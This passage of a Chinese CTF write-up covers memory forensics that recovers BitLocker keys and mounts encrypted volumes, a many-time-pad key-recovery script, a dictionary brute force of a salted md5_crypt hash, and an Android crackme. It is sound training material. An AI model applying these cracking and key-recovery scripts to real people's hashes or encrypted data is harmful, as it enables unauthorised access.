GlrYWNodSBrYSBwaWthY2h1IHBpcGkgcGkgcGlrYWNodSBwaWthY2h1IHBpY2h1IHBpIHBpa2FjaHUga2Ega2Ega2EgcGlrYWNodSBwaSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUga2Ega2Ega2Ega2Ega2Ega2EgcGlrYWNodSBwaXBpIHBpIHBpa2FjaHUgcGljaHUgcGlrYWNodSBwaXBpIGthIGthIGthIGthIGthIHBpa2FjaHUgcGkgcGkgcGkgcGkgcGkgcGlrYWNodSBwaWNodSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpa2FjaHUga2EgcGlrYWNodSBrYSBrYSBrYSBrYSBwaWthY2h1IHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpIHBpa2FjaHUgcGlwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaSBwaWthY2h1IA==</p>\n</blockquote>\n<p>base64 解密，得到：</p>\n<blockquote>\n<p>pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu ka chu pipi pipi pipi pipi pi pi pikachu pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu pichu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu ka ka ka ka pikachu pi pi pikachu pi pi pikachu pipi pikachu pichu ka ka ka ka ka pikachu pipi pi pi pikachu pichu pi pi pi pikachu ka ka ka pikachu pipi pikachu ka ka ka ka ka pikachu pi pi pi pikachu pichu ka pikachu pi pi pi pikachu ka pikachu pipi pi pikachu pikachu pichu pi pikachu ka ka ka pikachu pi pikachu pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka pikachu pipi pi pikachu pichu pikachu pipi ka ka ka ka ka pikachu pi pi pi pi pi pikachu pichu ka ka pikachu pi pi pi pi pikachu ka pikachu ka ka ka ka pikachu pi pi pi pi pi pi pi pi pikachu pipi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu</p>\n</blockquote>\n<p>pikalang 解密网站：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGNvZGUuZnIvcGlrYWxhbmctbGFuZ3VhZ2U=\">https://www.dcode.fr/pikalang-language</span><br />\n 解密得 flag</p>\n<h3 id=\"内存中的secret\"><a class=\"anchor\" href=\"#内存中的secret\">#</a> 内存中的 secret</h3>\n<p>拿到两个文件， <code>secret.raw</code>  和  <code>yuijm0-=pkl;</code></p>\n<p>用 volatility 扫描 <code>secret.raw</code> ： <code>volatility -f secret.raw imageinfo</code> ，得到：</p>\n<blockquote>\n<p>Suggested Profile(s) : Win10x64_14393, Win10x64_10586, Win10x64, Win2016x64_14393</p>\n</blockquote>\n<p>是一个内存镜像文件，同时获得内存的操作系统类型及版本</p>\n<p>使用 AXIOM 分析内存镜像文件，镜像配置文件直接选择  <code>Win10x64_14393</code> ：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682445061/Typera/2023/04/e34c8c2bc8f3779902c6fc3ef8d6d26f.png\" alt=\"image-20230426015056726\" /></p>\n<p>AXIOM 分析完毕后，先好好地翻一翻，看看都有啥。<br />\n使用痕迹 --&gt; 操作系统 --&gt; Windows 时间线活动，能找到不少 VeraCrypt 的运行痕迹：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682445044/Typera/2023/04/3c5e8d2335b4749ed416a8374458b0d1.png\" alt=\"image-20230426015040521\" /></p>\n<p>使用痕迹 --&gt; web 相关，对日期做降序排序之后，能看到不少文件记录，<br />\n值得注意的有：几个虚拟磁盘文件，很可疑的 flag.txt.txt，BitLocker 恢复密钥，decrypt.png，secret.zip<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682445040/Typera/2023/04/858e96afc434419d85425864be03a11b.png\" alt=\"image-20230426015035954\" /><br />\n 使用痕迹 --&gt; 加密，能看到 5 个 BitLocker 恢复密钥文件，其中四个恢复密钥部分内容完整，且包含有三个不同的恢复密钥，如下：<br />\n <code>109703-115929-085558-382888-715638-661716-466774-220858</code> <br />\n <code>172612-531773-032945-133364-584639-681373-481602-511291</code> <br />\n <code>109703-115929-085558-382888-715638-661716-466774-233200</code></p>\n<p>结合 VeraCrypt 的运行痕迹，猜测 <code>yuijm0-=pkl;</code>  应该是一个磁盘文件，大概需要使用 VeraCrypt 进行挂载，<br />\nweb 相关中得到的几个可以文件，应该与挂载之后的步骤有关联，<br />\n几个 BitLocker 恢复密钥，应该是需要我们使用恢复密钥，解开后面得到的某个文件。</p>\n<p>结合所给的提示：键盘密码，发现该文件的文件名很有特点，其轨迹如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682445035/Typera/2023/04/e5efed00ab6006e2ec2efbfeb24d0dbf.png\" alt=\"image-20230426015029743\" /></p>\n<p>可以看出，应该是 TZ，推测挂载需使用的密码应该就是这个。<br />\n成功将磁盘文件挂载到本地后，得到一个虚拟磁盘文件： <code>encrypt.vhd</code></p>\n<p>打开 DiskGenius，磁盘 --&gt; 打开虚拟磁盘文件，选择上一步得到的文件，<br />\n是使用 BitLocker 加密的：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682445028/Typera/2023/04/f84d4415570a55914af21382e4c88d08.png\" alt=\"image-20230426015024693\" /></p>\n<p>依次尝试之前获得的三个恢复密钥，可以成功解开，获得  <code>decrypt.png</code>  和 <code>secret.zip</code> ：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682445027/Typera/2023/04/6a6c5ab814e6d331f41a18998a8a6ff8.png\" alt=\"image-20230426015019970\" /></p>\n<p>其中， <code>secret.zip</code>  被加密，结合文件名推测 <code>decrypt,png</code>  应该包含密码。<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682445026/Typera/2023/04/70720bc6a39d9eab22e5f340a1829e4c.png\" alt=\"image-20230426015015401\" /></p>\n<p>文字提示：致敬 babydisk，可以联想到初赛的那道题，查看 wp 后获得关键词<strong>螺旋</strong>。<br />\n尝试后得到密码为：从右上角开始，按顺时针旋转的顺序列出偏旁： <code>⼃⼇⼋⼏⼎⼍⼌⼈⼄⼀⼁⼂⼆⼊⼉⼅</code> <br />\n直接复制维基的 Unicode，使用 7z 解才成功<br />\n（必须注意字符的问题，手打出来的偏旁，可能因为输入法的原因，无论如何也解不出来）</p>\n<p>解得 flag.txt 内容如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682445014/Typera/2023/04/3a481abbd31dbb4dba5468a45f209de5.png\" alt=\"image-20230426015010492\" /></p>\n<p>用脚本解密：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">base64stego_decrypt</span>(<span class=\"params\">lines</span>):</span><br><span class=\"line\">    base64char = <span class=\"string\">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>     </span><br><span class=\"line\">    bintext = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> lines:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> line.find(<span class=\"string\">&quot;==&quot;</span>) &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">            tmp = <span class=\"built_in\">bin</span>(base64char.find(line[-<span class=\"number\">3</span>]) &amp; <span class=\"number\">15</span>)[<span class=\"number\">2</span>:]</span><br><span class=\"line\">            bintext = bintext+<span class=\"string\">&quot;0&quot;</span>*(<span class=\"number\">4</span>-<span class=\"built_in\">len</span>(tmp))+tmp</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> line.find(<span class=\"string\">&quot;=&quot;</span>) &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">            tmp = <span class=\"built_in\">bin</span>(base64char.find(line[-<span class=\"number\">2</span>]) &amp; <span class=\"number\">3</span>)[<span class=\"number\">2</span>:]</span><br><span class=\"line\">            bintext = bintext+<span class=\"string\">&quot;0&quot;</span>*(<span class=\"number\">2</span>-<span class=\"built_in\">len</span>(tmp))+tmp</span><br><span class=\"line\">    text = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">len</span>(bintext) % <span class=\"number\">8</span> != <span class=\"number\">0</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;error&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(bintext), <span class=\"number\">8</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(i+<span class=\"number\">8</span> &gt; <span class=\"built_in\">len</span>(bintext)):</span><br><span class=\"line\">                text = text+<span class=\"string\">&quot;-&quot;</span>+bintext[i:]</span><br><span class=\"line\">                <span class=\"keyword\">return</span> text</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                text = text+<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(bintext[i:i+<span class=\"number\">8</span>], <span class=\"number\">2</span>))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(bintext), <span class=\"number\">8</span>):</span><br><span class=\"line\">            text = text+<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(bintext[i:i+<span class=\"number\">8</span>], <span class=\"number\">2</span>))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> text</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    path = <span class=\"string\">&quot;flag.txt&quot;</span></span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(path, <span class=\"string\">&quot;r&quot;</span>)</span><br><span class=\"line\">    line = file.read().splitlines()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(base64stego_decrypt(line))</span><br></pre></td></tr></table></figure><br />\n 得到 flag： <code>MemoRy_S1cr1t</code></p>\n<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> CRYPTO</h2>\n<h3 id=\"eazy\"><a class=\"anchor\" href=\"#eazy\">#</a> eazy</h3>\n<p a9462922e5da8ef93d213c33168881c5=\"\"><code>flag</code> : flag</p>\n<p>打开后得到 base64，解密得到：<br />\nsvciqytf10r3ln!nule7<br />\nW 形栅栏解密，栏数为 3，得到：<br />\nsyntvfu1c0lri3elqn7!<br />\n 凯撒直接遍历，<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">model = <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class=\"line\">model2 = <span class=\"string\">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">str1 = <span class=\"string\">&quot;syntvfu1c0lri3elqn7!&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> key <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">27</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> str1:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> s.islower():</span><br><span class=\"line\">            n = model.find(s)</span><br><span class=\"line\">            s = model[n-key]</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> s.isupper():</span><br><span class=\"line\">            n = model2.find(s)</span><br><span class=\"line\">            s = model2[n-key]</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(s, end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><br />\n 得到：<br />\nflagish1p0yev3ryda7!，<br />\n就是：flag is h1p0yev3ryda7!<br />\n 然后 h1p0yev3ryda7! 进行 md5 32 (小写) 加密，得到 flag</p>\n<h3 id=\"runfaster\"><a class=\"anchor\" href=\"#runfaster\">#</a> RunFaster</h3>\n<p 0ed7bc5c61e32c10e082abd2b5589a22=\"\"><code>flag</code> : flag</p>\n<p>下载题目后查看 ciphertext.txt，发下里面是整齐的 16 进制串，题目无其他提示，转成字符后无实意。不过之前比赛遇到过类似的题目，是 OTP 一次密码，这样确实也符合题目 RunFaster，参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVhbngubmV0L21hbnktdGltZS1wYWQv\"> Many-Time-Pad 攻击</span>，修改脚本逆求 key。</p>\n<p>MTP 脚本如下</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> Crypto.Util.strxor <span class=\"keyword\">as</span> xo</span><br><span class=\"line\"><span class=\"keyword\">import</span> libnum, codecs, numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">isChr</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>) &lt;= x <span class=\"keyword\">and</span> x &lt;= <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;z&#x27;</span>): <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>) &lt;= x <span class=\"keyword\">and</span> x &lt;= <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;Z&#x27;</span>): <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">infer</span>(<span class=\"params\">index, pos</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> msg[index, pos] != <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\">    msg[index, pos] = <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(c)):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> x != index:</span><br><span class=\"line\">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">dat = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getSpace</span>():</span><br><span class=\"line\">    <span class=\"keyword\">for</span> index, x <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(c):</span><br><span class=\"line\">        res = [xo.strxor(x, y) <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> c <span class=\"keyword\">if</span> x!=y]</span><br><span class=\"line\">        f = <span class=\"keyword\">lambda</span> pos: <span class=\"built_in\">len</span>(<span class=\"built_in\">list</span>(<span class=\"built_in\">filter</span>(isChr, [s[pos] <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> res])))</span><br><span class=\"line\">        cnt = [f(pos) <span class=\"keyword\">for</span> pos <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(x))]</span><br><span class=\"line\">        <span class=\"keyword\">for</span> pos <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(x)):</span><br><span class=\"line\">            dat.append((f(pos), index, pos))</span><br><span class=\"line\"></span><br><span class=\"line\">c = [codecs.decode(x.strip().encode(), <span class=\"string\">&#x27;hex&#x27;</span>) <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;Problem.txt&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>).readlines()]</span><br><span class=\"line\"></span><br><span class=\"line\">msg = np.zeros([<span class=\"built_in\">len</span>(c), <span class=\"built_in\">len</span>(c[<span class=\"number\">0</span>])], dtype=<span class=\"built_in\">int</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">getSpace()</span><br><span class=\"line\"></span><br><span class=\"line\">dat = <span class=\"built_in\">sorted</span>(dat)[::-<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> w, index, pos <span class=\"keyword\">in</span> dat:</span><br><span class=\"line\">    infer(index, pos)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\n&#x27;</span>.join([<span class=\"string\">&#x27;&#x27;</span>.join([<span class=\"built_in\">chr</span>(c) <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> x]) <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> msg]))</span><br></pre></td></tr></table></figure></p>\n<p>得到对应输出</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444984/Typera/2023/04/fe48ad2860db212c649751149211d71d.png\" alt=\"\" /></p>\n<p>可见能看到明文信息，从最后一串下手，可以猜出是 e  were neither up nor down. OK ，根据明文与密文异或求出 key。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s=<span class=\"built_in\">bytes</span>.fromhex(<span class=\"string\">&#x27;32397f47102d3c101b3a2a34063a2013354111173036600a0c44314c602d32&#x27;</span>)</span><br><span class=\"line\">txt=<span class=\"string\">&quot;e  were neither up nor down. OK&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(s)):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(txt[i])^s[i]),end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#W_0u_Y0u_C@n_R3@11y_D@nc3_b@by</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(<span class=\"string\">&#x27;25&#x27;</span>,<span class=\"number\">16</span>)^<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;e&#x27;</span>)))</span><br><span class=\"line\"><span class=\"comment\">#W@_0u_Y0u_C@n_R3@11y_D@nc3_b@by</span></span><br></pre></td></tr></table></figure></p>\n<p>还有一位没有还原，可以结合第一句话是倒数第四句话 they 来推测，拿到正确的 key，之后 key 与所有密文异或。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/ff1f317976f4a27903d448b1ab4c8a29.png\" alt=\"image-20220619211840330\" /></p>\n<p>还原出的 key 作为压缩包解密，第二关给了一个字典和一个加 salt 的 hash，hash 无法逆求所以只能是爆破将字典的字符按照对应的 salt 依次爆破。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> passlib.<span class=\"built_in\">hash</span> <span class=\"keyword\">import</span> md5_crypt</span><br><span class=\"line\">f=<span class=\"built_in\">open</span>(<span class=\"string\">r&#x27;C:\\Users\\lx\\Desktop\\分区赛\\密码\\minirockyou.txt&#x27;</span>,<span class=\"string\">&#x27;r&#x27;</span>)</span><br><span class=\"line\">enc=<span class=\"string\">&#x27;$1$ciscn010$mSuTlV75nZZGGjoayF/nS0&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    s=f.readline().replace(<span class=\"string\">&#x27;\\n&#x27;</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> enc <span class=\"keyword\">in</span> md5_crypt.<span class=\"built_in\">hash</span>(s,salt=<span class=\"string\">&#x27;ciscn010&#x27;</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(s)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure></p>\n<p>因为密码数据比较短，所以依次手动修改 enc 和 salt 即可，最终得到一串明文字符。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">m=<span class=\"string\">&quot;the second letter of each word in this list in order&quot;</span> <span class=\"comment\">#取出这些单词的第二个字符</span></span><br><span class=\"line\">m=m.split(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">str</span>=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(m)):</span><br><span class=\"line\">    <span class=\"built_in\">str</span>+=m[i][<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">str</span>)</span><br><span class=\"line\"><span class=\"comment\">#heefaonhinr</span></span><br><span class=\"line\"><span class=\"comment\">#flag&#123;0ed7bc5c61e32c10e082abd2b5589a22&#125;</span></span><br></pre></td></tr></table></figure></p>\n<p>直接将得到的字符包上 flag 提交不对，长度不对，其余 flag 的内容均为 32 位 16 进制，所以尝试 flag {md5 (heefaonhinr)}，: ) 提交正确。</p>\n<h2 id=\"re\"><a class=\"anchor\" href=\"#re\">#</a> RE</h2>\n<h3 id=\"crackme2\"><a class=\"anchor\" href=\"#crackme2\">#</a> crackme2</h3>\n<p 50c418de67942e713517e900dbd12183=\"\"><code>flag</code> : flag</p>\n<p>android 逆向，jadx 打开，查看 main1Activity，其中主要函数如下<br />\n <figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">native</span> String <span class=\"title function_\">stringFromJNI</span><span class=\"params\">(String str)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">    System.loadLibrary(<span class=\"string\">&quot;crackme2&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">boolean</span> <span class=\"title function_\">checkFmt</span><span class=\"params\">(String input)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; input.length(); i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (Character.isUpperCase(input.charAt(i))) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"comment\">/* synthetic */</span> <span class=\"keyword\">void</span> m0lambda$onCreate$<span class=\"number\">0</span>$comctfcrackme2Main1Activity(EditText et_input, View v) &#123;</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">input</span> <span class=\"operator\">=</span> et_input.getText().toString();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (input.startsWith(<span class=\"string\">&quot;flag&#123;&quot;</span>) &amp;&amp; input.endsWith(<span class=\"string\">&quot;&#125;&quot;</span>) &amp;&amp; input.length() &gt; <span class=\"number\">6</span> &amp;&amp; input.length() &lt; <span class=\"number\">39</span> &amp;&amp; checkFmt(input)) &#123;</span><br><span class=\"line\">        Toast.makeText(<span class=\"built_in\">this</span>, stringFromJNI(input.substring(<span class=\"number\">5</span>, input.length() - <span class=\"number\">1</span>)), <span class=\"number\">0</span>).show();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br />\n 首先 check 了 flag 的格式和长度，checkFmt 用于确定输入无大写，之后调用了 stringFromJNI 即 native 层函数，故主要逻辑在 so 文件，先解压 apk，ida 加载 x86 的 so 文件，首先查看导出表，发现该函数是静态注册的，修改一下参数如下。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/35f672f500d43444bd5231a0a8c258b7.png\" alt=\"image-20220619201210787\" /></p>\n<p>首先判断传入内容是否为 32 位，之后跟进 sub_D1FE5640 函数对 flag 的内容进行 check。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/106131f536b262650aa3b590534a0514.png\" alt=\"image-20220619201406417\" /></p>\n<p>这一步是读取序列化文件 tmp，用于之后加密使用，紧接着通过 sscanf 将输入两个一组转为 16 进制存入一个数组，32 为输入为仅为 16 进制的字符。</p>\n<p><img 